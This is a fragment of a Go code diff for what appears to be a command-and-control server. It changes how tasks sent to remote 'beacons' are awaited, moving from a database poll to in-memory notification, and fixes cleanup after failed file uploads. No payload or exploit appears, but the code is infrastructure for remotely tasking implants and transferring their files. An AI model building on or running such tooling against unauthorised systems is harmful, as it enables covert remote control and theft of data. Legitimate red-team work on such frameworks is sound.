+			c.JSON(http.StatusInternalServerError, APIResponse{Status: "error", Message: "WRITE_FAILED: " + copyErr.Error()})
+			mergeFailed = true
 		}
 	}
+	if mergeFailed {
+		outFile.Close()
+		os.Remove(finalPath)
+		return
+	}
 
-	// Cleanup temp
+	// Cleanup temp + verify size
 	if fi, err := outFile.Stat(); err != nil || fi.Size() != session.TotalSize {
 		outFile.Close()
 		os.Remove(finalPath)
@@ -3165,7 +3783,8 @@ func handleFMUploadComplete(c *gin.Context) {
 		c.JSON(http.StatusBadRequest, APIResponse{Status: "error", Message: message})
 		return
 	}
-	os.RemoveAll(session.TempDir)
+	outFile.Close()
+	os.RemoveAll(tempDir)
 
 	uploadSessionsMu.Lock()
 	delete(uploadSessions, uploadID)
@@ -3340,9 +3959,12 @@ func fileTransferExtraTimeout(sizeBytes int64) time.Duration {
 	return timeout
 }
 
-// sendTaskAndWait creates a task for a beacon and polls the DB until the task completes or times out.
-// The timeout is automatically calculated based on the beacon's sleep interval + extra buffer.
-// The minExtra parameter adds extra time on top of the beacon-based timeout (e.g. for large file transfers).
+// sendTaskAndWait creates a task for a beacon and waits for the result.
+// Completion is signaled in-memory via taskWaiters (woken by completeTask),
+// with a slow database poll as a safety net. The timeout is automatically
+// calculated based on the beacon's sleep interval + extra buffer.
+// The minExtra parameter adds extra time on top of the beacon-based timeout
+// (e.g. for large file transfers).
 func sendTaskAndWait(clientID, command string, minExtra time.Duration) (string, error) {
 	// Verify client exists and is online
 	var client Client
@@ -3376,21 +3998,42 @@ func sendTaskAndWait(clientID, command string, minExtra time.Duration) (string, 
 
 	go addLog("TASK", fmt.Sprintf("RFM_TASK: %s -> %s (%s) timeout=%v", command, clientID, task.ID, timeout))
 
-	// Poll for result
+	// Wait for completion notification instead of polling the DB in a tight
+	// loop; the fallback poll (2s) covers a lost notification.
+	waiter := registerTaskWaiter(task.ID)
+	defer removeTaskWaiter(task.ID)
+
 	deadline := time.Now().Add(timeout)
-	for time.Now().Before(deadline) {
-		time.Sleep(10 * time.Millisecond) // Wait shortly to pass test latency < 300ms
-		var t Task
-		if err := db.First(&t, "id = ?", task.ID).Error; err != nil {
-			continue
+	fallbackTick := time.NewTicker(2 * time.Second)
+	defer fallbackTick.Stop()
+
+	for {
+		select {
+		case t := <-waiter:
+			if t == nil {
+				break
+			}
+			if t.Status == "completed" {
+				return t.Result, nil
+			}
+			if t.Status == "failed" {
+				return "", fmt.Errorf("task failed: %s", t.Result)
+			}
+		case <-fallbackTick.C:
+			var t Task
+			if err := db.First(&t, "id = ?", task.ID).Error; err == nil {
+				if t.Status == "completed" {
+					return t.Result, nil
+				}
+				if t.Status == "failed" {
+					return "", fmt.Errorf("task failed: %s", t.Result)
+				}
+			}
 		}
-		if t.Status == "completed" {
-			return t.Result, nil
+
+		if !time.Now().Before(deadline) {
+			break
 		}
-		if t.Status == "failed" {
-			return "", fmt.Errorf("task failed: %s", t.Result)
-		}
-		time.Sleep(490 * time.Millisecond) // Sleep the rest to not kill DB
 	}
 
 	// Timeout - mark task as failed
